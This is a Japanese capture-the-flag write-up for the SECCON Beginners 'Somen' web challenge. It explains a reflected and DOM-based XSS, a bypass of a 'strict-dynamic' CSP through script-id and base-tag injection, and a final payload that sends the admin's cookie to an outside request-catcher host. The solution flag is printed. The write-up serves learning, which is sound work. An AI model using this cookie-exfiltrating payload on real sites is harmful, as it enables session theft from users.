# Somen
```
Somen is tasty.

https://somen.quals.beginners.seccon.jp
Hint:
　worker.js (sha1: 47c8e9c879e2a2fb2e5435f2d0fcfaa274671f43)
　index.php (sha1: dffac56c2435b529e1bb60c6f71803aded2051af)
```

<br>

## Solution

![1](https://user-images.githubusercontent.com/47602064/83315075-904cde80-a258-11ea-9f9d-f6bcd4351e95.png)

問題のurlにいくとと2箇所に入力欄があるページに移動しました。

ヒントに2つのファイルが渡されているのでそっちも見てみます。

すると`worker.js`に以下のことが書いてあります。

```javascript
// set cookie
await page.setCookie({
    name: 'flag',
    value: process.env.FLAG,
    domain: process.env.DOMAIN,
    expires: Date.now() / 1000 + 10,
});
```

これでflagはcookieに設定されているとわかります。

<br>

次に`index.php`の方を見てみます。

すると以下の`username`がそのまま出力されていることがわかります。

なのでReflected XSSが出来ると思われます。

```php
<title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>
```

あともう一つ、以下でDOM-based XSSも出来ると思われます。

```php
document.getElementById("message").innerHTML = `${username}, I recommend ${adjective} somen for you.`;
```

<br>

以上にあがった2つの脆弱性を使って解くと思われますが、以下に制限がされていました。

・`inde.php`でのContent制限　`CSP`

```php
<?php
$nonce = base64_encode(random_bytes(20));
header("Content-Security-Policy: default-src 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A='");
?>
```

・`security.js`での入力制限

```html
<script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
```

```html
const username = new URL(location).searchParams.get("username");
if (username !== null && ! /^[a-zA-Z0-9]*$/.test(username)) {
    document.location = "/error.php";
}
```

どうにかしてこれらの制限をクリアさせなければ難しそうです。

<br><br>

まずはじめに、RXSSが`title`要素の中にあることに注目しました。

１つ目の解決策として`/security.js`を実行させないようにしなくればなりません。

ここで以下にあるように`script`要素で`nonce`が付けられて閉じていることがわかります。

```html
<title>Best somen for <?= isset($_GET["username"]) ? $_GET["username"] : "You" ?></title>

    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
    <script nonce="<?= $nonce ?>">
```

なので`username`に`</title><script>`を入れてみる場合を考えてみます。

```html
<title>Best somen for </title><script></title>

    <script src="/security.js" integrity="sha256-nus+LGcHkEgf6BITG7CKrSgUIb1qMexlF8e5Iwx1L2A="></script>
    <script nonce="FHnRMK/GC62ODRynO72fHYGsHj4=">
```

これで`<scrit>`内がJavascriptのコードをして解釈されると思われます。

なので`/security.js`を実行させないようにできます。

<br>

次に`CSP`のbypassを考えます。

何かをしてJSコードを実行出来るようにします。

CSPの部分をキーワードで調べてみると`dynamic-strict`でヒットしました。

`message`という`ID`属性がある`script`を上手く挿入すれば実行できるそうです。

それを本来の挿入先より前に設定してあげることで任意のJSを実行してくれる仕組みみたいです。

DOMがJSと解釈されないように`//`を先頭に付けてコメントアウトするようにします。

試しに`alert(document.domain)//</title><script id="message"></script><script>`を挿入してみます。

すると`alert(document.domain)`により、アラートが表示されました。

![4](https://user-images.githubusercontent.com/47602064/83319201-3a3b6380-a277-11ea-8222-13b4c54362de.png)

これでJSを実行できるようになりました。

<br><br>

あとはこれらを上手く組み合わせて使い、`cookie`を得れればflagが手に入ります。

ここで任意のURLにリダイレクトさせることで`cookie`を得てみます。

今回は`Beeceptor`を使いました。

`https://testtest3.free.beeceptor.com`というのを作って、用意してここに送らせてみます。

リダイレクト先の埋め込みは`base`タグで指定してみます。

<br>

最終的に以下を２つ目の入力欄に入力してadminに送ります。

`document.location='/?'+document.cookie//</title><base href="//testtest3.free.beeceptor.com"><script id="message"></script>`

するとこんな感じに表示されるので`Beeceptor`で見てみるとflagが表示されました。

![3](https://user-images.githubusercontent.com/47602064/83318873-cea3c700-a273-11ea-91e1-c7e47ce6e8f1.png)

![2](https://user-images.githubusercontent.com/47602064/83318837-5f2dd780-a273-11ea-966a-0e546c433fd4.png)

<br>

## FLAG: ctf4b{1_w0uld_l1k3_70_347_50m3n_b3f0r3_7ry1n6_70_3xpl017}
